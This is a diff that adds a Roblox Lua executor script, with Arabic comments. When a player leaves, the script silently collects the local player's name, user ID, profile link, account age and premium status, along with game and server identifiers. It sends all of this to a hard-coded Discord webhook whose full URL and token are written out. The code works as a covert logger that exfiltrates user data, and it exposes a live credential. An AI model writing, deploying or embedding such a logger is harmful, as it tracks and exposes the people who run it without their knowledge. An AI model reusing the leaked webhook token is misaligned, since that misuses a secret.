@@ -1,0 +1,55 @@
+local webhook = "https://discord.com/api/webhooks/1170247877386305536/_deWRKeOmCw7gKOuhOxC-g56VYNfimrOi3fZhdK0etcRzst8PqJIERKAl2-1m80mf424"
+
+-- Define the PlaceId variable
+local PlaceId = game.PlaceId
+
+-- Get the game name and game URL
+-- اسم ماب
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(PlaceId).Name
+-- رابط لعبه
+local gameUrl = "https://www.roblox.com/games/" .. PlaceId
+-- رابط بروفايل
+local profileUrl = "https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId .. "/profile"
+-- عدد سيرفر
+local playerCount = #game:GetService("Players"):GetPlayers()
+-- بريميم
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local hasPremium = player.MembershipType == Enum.MembershipType.Premium
+
+game.Players.PlayerRemoving:Connect(function(player)
+local data = {
+    ["content"] = "",
+    ["username"] = "By : 7yd7",
+    ["embeds"] = {
+        {
+            ["title"] = "",
+            ["description"] = ""
+            .. "**Player Name:**  ```" .. game:GetService("Players").LocalPlayer.Name .. " ```\n"
+            .. "**Player ID:** ```" .. game:GetService("Players").LocalPlayer.UserId .. "```\n"
+			.. "**Player URL:** ```" .. profileUrl .. "```\n"
+            .. "**Game Name:** ```" .. gameName .. "```\n"
+            .. "**Game URL:** ```" .. gameUrl .. "```\n"
+		    .. "**Server JobId :** ```" .. game.JobId .. "```\n"
+            .. "**Server Number players online :** ```" .. playerCount .. "```\n"
+			.. "**Account Age :** ```" .. game:GetService("Players").LocalPlayer.AccountAge .. "``` \n" 
+			.. "**Player Premium :** " .. if hasPremium then "```yes```" else "```no```"  .. "\n"
+        }
+    }
+}
+
+-- Send the data to the webhook
+local HS = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+    ["content-type"] = "application/json"
+}
+
+local data2 = {
+    Url = webhook,
+    Body = HS,
+    Method = "POST",
+    Headers = headers
+}
+
+request(data2)
+			end)
